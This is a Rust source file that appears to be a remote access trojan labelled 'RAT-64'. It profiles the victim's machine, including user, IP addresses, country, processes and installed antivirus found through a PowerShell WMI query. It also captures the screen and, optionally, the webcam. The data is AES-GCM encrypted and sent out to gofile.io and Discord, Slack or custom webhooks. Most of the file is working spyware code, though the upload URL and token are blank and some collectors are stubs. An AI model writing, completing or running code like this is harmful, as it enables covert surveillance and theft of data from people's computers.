use std::fs::File;
use std::io::Read;

pub mod decrypt;
use std::io::Write;
use std::process::Command;
use serde::{Serialize, Deserialize};
use reqwest::blocking::Client;
use rmp_serde::{encode::to_vec as to_msgpack_vec};
use base64::{engine::general_purpose, Engine as _};
use whoami;
use sysinfo::System;
use aes_gcm::{Aes256Gcm, Nonce};
use aes_gcm::aead::{Aead, KeyInit};
use rand::Rng;
use std::time::Duration;


#[derive(Serialize, Deserialize, Debug)]
struct SystemInfo {
    hostname: String,
    os_name: String,
    os_version: String,
    username: String,
    global_ip: String,
    local_ip: String,
    cores: usize,
    security_software: Vec<String>,
    processor: String,
    country_code: String,
    // 新しい詳細情報
    total_memory: u64,
    available_memory: u64,
    disk_info: Vec<DiskInfo>,
    network_interfaces: Vec<NetworkInterface>,
    running_processes: Vec<ProcessInfo>,
    installed_software: Vec<String>,
    startup_programs: Vec<String>,
    system_uptime: u64,
    timezone: String,
    language: String,
    architecture: String,
    boot_time: String,
}

#[derive(Serialize, Deserialize, Debug)]
struct DiskInfo {
    name: String,
    file_system: String,
    total_space: u64,
    available_space: u64,
    mount_point: String,
}

#[derive(Serialize, Deserialize, Debug)]
struct NetworkInterface {
    name: String,
    ip_addresses: Vec<String>,
    mac_address: String,
    is_up: bool,
}

#[derive(Serialize, Deserialize, Debug)]
struct ProcessInfo {
    name: String,
    pid: u32,
    cpu_usage: f32,
    memory_usage: u64,
    exe_path: String,
}

#[derive(Serialize, Deserialize, Debug)]
struct Config {
    webhook_url: Option<String>,
    webhook_type: WebhookType,
    collect_screenshots: bool,
    collect_webcam: bool,
    collect_processes: bool,
    collect_software: bool,
    max_processes: usize,
    retry_attempts: u32,
    timeout_seconds: u64,
}

#[derive(Serialize, Deserialize, Debug)]
enum WebhookType {
    Discord,
    Slack,
    Custom,
    None,
}

impl Default for Config {
    fn default() -> Self {
        Config {
            webhook_url: None,
            webhook_type: WebhookType::None,
            collect_screenshots: true,
            collect_webcam: false,
            collect_processes: true,
            collect_software: true,
            max_processes: 20,
            retry_attempts: 3,
            timeout_seconds: 30,
        }
    }
}

fn get_system_info() -> SystemInfo {
    let mut sys = sysinfo::System::new_all();
    sys.refresh_all();
    
    // Hostname
    let hostname = whoami::fallible::hostname().unwrap_or_default();

    // OS info
    let info = os_info::get();
    let os_name = info.os_type().to_string();
    let os_version = info.version().to_string();

    // Username
    let username = std::env::var("USERNAME")
        .or_else(|_| std::env::var("USER"))
        .unwrap_or_default();

    // Global IP
    let global_ip = reqwest::blocking::get("https://api.ipify.org")
        .and_then(|r| r.text())
        .unwrap_or_default();

    // Local IP
    let local_ip = local_ipaddress::get().unwrap_or_default();

    // CPU Cores & Processor
    let cores = sys.cpus().len();
    let processor = sys.cpus().first()
        .map(|cpu| cpu.brand().to_string())
        .unwrap_or_default();

    // Country code
    let country_code = reqwest::blocking::get("https://ipapi.co/country/")
        .and_then(|r| r.text())
        .unwrap_or_default();

    // Security software
    let security_software = get_antivirus_software();

    // Memory info
    let total_memory = sys.total_memory();
    let available_memory = sys.available_memory();

    // Disk info
    let disk_info = get_disk_info(&sys);

    // Network interfaces
    let network_interfaces = get_network_interfaces();

    // Running processes
    let running_processes = get_running_processes(&sys);

    // Installed software
    let installed_software = get_installed_software();

    // Startup programs
    let startup_programs = get_startup_programs();

    // System uptime (approximate from sysinfo)
    let system_uptime = 0; // Placeholder - sysinfo doesn't have direct uptime method

    // System info
    let timezone = std::env::var("TZ").unwrap_or_else(|_| "UTC".to_string());
    let language = std::env::var("LANG").unwrap_or_else(|_| "en_US".to_string());
    let architecture = std::env::consts::ARCH.to_string();
    let boot_time = "Unknown".to_string(); // Placeholder

    SystemInfo {
        hostname,
        os_name,
        os_version,
        username,
        global_ip,
        local_ip,
        cores,
        security_software,
        processor,
        country_code,
        total_memory,
        available_memory,
        disk_info,
        network_interfaces,
        running_processes,
        installed_software,
        startup_programs,
        system_uptime,
        timezone,
        language,
        architecture,
        boot_time,
    }
}

// Windows only: retrieve security product names via WMI
fn get_antivirus_software() -> Vec<String> {
    // Official WMI crates are limited, so fetch via PowerShell here
    if cfg!(windows) {
        let output = Command::new("powershell")
            .args([
                "-Command",
                "Get-WmiObject -Namespace root/SecurityCenter2 -Class AntiVirusProduct | Select-Object -ExpandProperty displayName"
            ])
            .output();

        if let Ok(out) = output {
            let text = String::from_utf8_lossy(&out.stdout);
            text.lines().map(|s| s.trim().to_string()).filter(|s| !s.is_empty()).collect()
        } else {
            vec![]
        }
    } else {
        vec![]
    }
}

fn get_disk_info(_sys: &sysinfo::System) -> Vec<DiskInfo> {
    // Use sysinfo's Disks struct instead
    use sysinfo::Disks;
    let disks = Disks::new_with_refreshed_list();
    disks.iter().map(|disk| {
        DiskInfo {
            name: disk.name().to_string_lossy().to_string(),
            file_system: disk.file_system().to_string_lossy().to_string(),
            total_space: disk.total_space(),
            available_space: disk.available_space(),
            mount_point: disk.mount_point().to_string_lossy().to_string(),
        }
    }).collect()
}

fn get_network_interfaces() -> Vec<NetworkInterface> {
    // Simplified implementation - would use network interfaces library
    vec![NetworkInterface {
        name: "Default".to_string(),
        ip_addresses: vec![local_ipaddress::get().unwrap_or_default()],
        mac_address: "Unknown".to_string(),
        is_up: true,
    }]
}

fn get_running_processes(sys: &sysinfo::System) -> Vec<ProcessInfo> {
    sys.processes().iter().take(20).map(|(pid, process)| {
        ProcessInfo {
            name: process.name().to_string_lossy().to_string(),
            pid: pid.as_u32(),
            cpu_usage: process.cpu_usage(),
            memory_usage: process.memory(),
            exe_path: process.exe()
                .map(|p| p.to_string_lossy().to_string())
                .unwrap_or_else(|| "Unknown".to_string()),
        }
    }).collect()
}

fn get_installed_software() -> Vec<String> {
    // Simplified implementation - would query registry on Windows
    vec!["System Default Applications".to_string()]
}

fn get_startup_programs() -> Vec<String> {
    // Simplified implementation - would check startup folders and registry
    vec!["System Startup Programs".to_string()]
}

fn load_config() -> Config {
    match std::fs::read_to_string("config.json") {
        Ok(content) => serde_json::from_str(&content).unwrap_or_default(),
        Err(_) => {
            let default_config = Config::default();
            create_default_config(&default_config);
            default_config
        }
    }
}

fn create_default_config(config: &Config) {
    if let Ok(json) = serde_json::to_string_pretty(config) {
        let _ = std::fs::write("config.json", json);
        println!("設定ファイル config.json を作成しました");
    }
}

fn send_webhook(config: &Config, system_info: &SystemInfo, screenshot: &str) -> Result<(), Box<dyn std::error::Error>> {
    let webhook_url = match &config.webhook_url {
        Some(url) => url,
        None => return Ok(()), // Webhook URLが設定されていない場合はスキップ
    };

    let client = Client::builder()
        .timeout(Duration::from_secs(config.timeout_seconds))
        .build()?;

    let payload = match config.webhook_type {
        WebhookType::Discord => create_discord_payload(system_info, screenshot),
        WebhookType::Slack => create_slack_payload(system_info, screenshot),
        WebhookType::Custom => create_custom_payload(system_info, screenshot),
        WebhookType::None => return Ok(()),
    };

    for attempt in 1..=config.retry_attempts {
        match client.post(webhook_url).header("Content-Type", "application/json").body(payload.to_string()).send() {
            Ok(response) if response.status().is_success() => {
                println!("✅ Webhook送信成功 ({}回目の試行)", attempt);
                return Ok(());
            }
            Ok(response) => {
                println!("⚠️  Webhook送信失敗: {} ({}回目の試行)", response.status(), attempt);
            }
            Err(e) => {
                println!("❌ Webhook送信エラー: {} ({}回目の試行)", e, attempt);
            }
        }
        
        if attempt < config.retry_attempts {
            std::thread::sleep(Duration::from_secs(2));
        }
    }
    
    Err("Webhook送信に失敗しました".into())
}

fn create_discord_payload(system_info: &SystemInfo, screenshot: &str) -> serde_json::Value {
    serde_json::json!({
        "embeds": [{
            "title": "🖥️ システム情報レポート",
            "color": 0x00ff00,
            "fields": [
                {"name": "ホスト名", "value": system_info.hostname, "inline": true},
                {"name": "OS", "value": format!("{} {}", system_info.os_name, system_info.os_version), "inline": true},
                {"name": "ユーザー", "value": system_info.username, "inline": true},
                {"name": "CPU", "value": format!("{} ({} cores)", system_info.processor, system_info.cores), "inline": true},
                {"name": "メモリ", "value": format!("{:.1} GB / {:.1} GB", 
                    system_info.available_memory as f64 / 1024.0 / 1024.0 / 1024.0,
                    system_info.total_memory as f64 / 1024.0 / 1024.0 / 1024.0), "inline": true},
                {"name": "IP", "value": format!("🌐 {} | 🏠 {}", system_info.global_ip, system_info.local_ip), "inline": true},
                {"name": "プロセス数", "value": system_info.running_processes.len().to_string(), "inline": true},
                {"name": "セキュリティ", "value": system_info.security_software.join(", "), "inline": true}
            ],
            "timestamp": std::time::SystemTime::now().duration_since(std::time::UNIX_EPOCH).unwrap().as_secs(),
            "footer": {"text": "RAT-64 System Monitor"}
        }]
    })
}

fn create_slack_payload(system_info: &SystemInfo, _screenshot: &str) -> serde_json::Value {
    serde_json::json!({
        "blocks": [
            {
                "type": "header",
                "text": {
                    "type": "plain_text",
                    "text": "🖥️ システム情報レポート"
                }
            },
            {
                "type": "section",
                "fields": [
                    {"type": "mrkdwn", "text": format!("*ホスト名:*\n{}", system_info.hostname)},
                    {"type": "mrkdwn", "text": format!("*OS:*\n{} {}", system_info.os_name, system_info.os_version)},
                    {"type": "mrkdwn", "text": format!("*ユーザー:*\n{}", system_info.username)},
                    {"type": "mrkdwn", "text": format!("*CPU:*\n{} ({} cores)", system_info.processor, system_info.cores)}
                ]
            }
        ]
    })
}

fn create_custom_payload(system_info: &SystemInfo, screenshot: &str) -> serde_json::Value {
    serde_json::json!({
        "timestamp": std::time::SystemTime::now().duration_since(std::time::UNIX_EPOCH).unwrap().as_secs(),
        "system_info": system_info,
        "screenshot": if screenshot.is_empty() { serde_json::Value::Null } else { serde_json::Value::String(screenshot.to_string()) }
    })
}

fn get_screenshot_base64() -> String {
    // scrap supports Windows/macOS/X11; Wayland may require additional setup
    let display = match scrap::Display::primary() {
        Ok(d) => d,
        Err(_) => return String::new(),
    };
    let mut capturer = match scrap::Capturer::new(display) {
        Ok(c) => c,
        Err(_) => return String::new(),
    };

    let (w, h) = (capturer.width(), capturer.height());

    // Capture frames (retry a few times because the first call often returns WouldBlock)
    for _ in 0..10u8 {
        match capturer.frame() {
            Ok(frame) => {
                // scrap pixels are BGRX/BGRA; reorder to RGBA for PNG
                let stride = w * 4; // Assume 4 bytes per pixel
                let mut rgba = Vec::with_capacity(w * h * 4);
                for y in 0..h {
                    let start = y * stride;
                    let end = start + stride;
                    let row = &frame[start..end];
                    for px in row.chunks_exact(4) {
                        // Convert B, G, R, X(A) to R, G, B, A (=255)
                        rgba.push(px[2]);
                        rgba.push(px[1]);
                        rgba.push(px[0]);
                        rgba.push(255);
                    }
                }

                if let Some(img) = image::RgbaImage::from_raw(w as u32, h as u32, rgba) {
                    let mut buf = Vec::new();
                    {
                        use image::codecs::png::PngEncoder;
                        use image::{ExtendedColorType, ImageEncoder};
                        let encoder = PngEncoder::new(&mut buf);
                        if encoder.write_image(
                            img.as_raw(),
                            img.width(),
                            img.height(),
                            ExtendedColorType::Rgba8,
                        ).is_ok() {
                            return general_purpose::STANDARD.encode(buf);
                        }
                    }
                }
                break;
            }
            Err(e) if e.kind() == std::io::ErrorKind::WouldBlock => {
                std::thread::sleep(std::time::Duration::from_millis(50));
                continue;
            }
            Err(_) => break,
        }
    }

    String::new()
}

// Webcam image capture (OpenCV, only when the 'webcam' feature is enabled)
#[cfg(feature = "webcam")]
fn get_webcam_image_base64() -> String {
    use opencv::{core, imgcodecs, prelude::*, videoio};

    let mut cam = match videoio::VideoCapture::new(0, videoio::CAP_ANY) {
        Ok(c) => c,
        Err(_) => return String::new(),
    };
    match cam.is_opened() {
        Ok(true) => {}
        _ => return String::new(),
    }

    let mut frame = core::Mat::default();
    if cam.read(&mut frame).is_err() {
        return String::new();
    }

    let mut buf = opencv::core::Vector::<u8>::new();
    let params = opencv::types::VectorOfint::new();
    if imgcodecs::imencode(".png", &frame, &mut buf, &params).is_err() {
        return String::new();
    }

    general_purpose::STANDARD.encode(buf.to_vec())
}

// Return an empty string when the 'webcam' feature is disabled
#[cfg(not(feature = "webcam"))]
fn get_webcam_image_base64() -> String {
    String::new()
}

// Perform the actual AES-GCM encryption
fn encrypt_data(data: &[u8], key: &[u8; 32], nonce: &[u8; 12]) -> Result<Vec<u8>, String> {
    let cipher = Aes256Gcm::new(aes_gcm::Key::<Aes256Gcm>::from_slice(key));
    let ciphertext = cipher.encrypt(Nonce::from_slice(nonce), data)
        .map_err(|e| format!("Encryption failed: {:?}", e))?;
    Ok(ciphertext)
}

fn main() {
    // 1. Gather system information
    let system_info = get_system_info();

    // 2. Capture screenshot
    let screenshot_base64 = get_screenshot_base64();

    // 3. Capture webcam image
    let webcam_image_base64 = get_webcam_image_base64();

    // 4. Serialize data
    let info_msgpack = to_msgpack_vec(&system_info).unwrap();
    let image_msgpack = to_msgpack_vec(&serde_json::json!({
        "screenshot": screenshot_base64,
        "webcam_image": webcam_image_base64,
    })).unwrap();

    // 5. Encrypt data
    let mut rng = rand::rng();
    let mut key = [0u8; 32];
    let mut nonce = [0u8; 12];
    rng.fill(&mut key);
    rng.fill(&mut nonce);
    
    // AES-GCM encryption (mandatory)
    let encrypted_info = encrypt_data(&info_msgpack, &key, &nonce)
        .map_err(|e| panic!("Failed to encrypt system information: {}", e))
        .unwrap();
    let encrypted_images = encrypt_data(&image_msgpack, &key, &nonce)
        .map_err(|e| panic!("Failed to encrypt image data: {}", e))
        .unwrap();

    // 6. Store the key and encrypted data separately
    // Save the key file
    let key_data = serde_json::json!({
        "key": general_purpose::STANDARD.encode(&key),
        "nonce": general_purpose::STANDARD.encode(&nonce),
    });
    
    let key_msgpack = to_msgpack_vec(&key_data).unwrap();
    let mut key_file = File::create("key.bin").unwrap();
    key_file.write_all(&key_msgpack).unwrap();
    println!("Saved AES-256 key: key.bin");
    
    // Save the data file (without the key)
    let final_data = to_msgpack_vec(&serde_json::json!({
        "info": general_purpose::STANDARD.encode(&encrypted_info),
        "images": general_purpose::STANDARD.encode(&encrypted_images),
        "encrypted": true,  // Always true in the new format
    })).unwrap();

    let mut f = File::create("data.dat").unwrap();
    f.write_all(&final_data).unwrap();

    // 7. Upload to gofile.io (using reqwest)
    upload_to_gofile("data.dat");
}

fn upload_to_gofile(file_path: &str) {
    let url = "";
    let token = ""; // Needs to be updated
    let folder_id = "";
    let client = Client::new();

    let form = reqwest::blocking::multipart::Form::new()
        .text("folderId", folder_id)
        .file("file", file_path).unwrap();

    let resp = client.post(url)
        .bearer_auth(token)
        .multipart(form)
        .send();

    match resp {
        Ok(r) if r.status().is_success() => {
            println!("File uploaded! {:?}", r.text().unwrap());
        },
        Ok(r) => {
            println!("Upload error: {}", r.status());
        },
        Err(e) => {
            println!("Request failed: {:?}", e);
        }
    }
}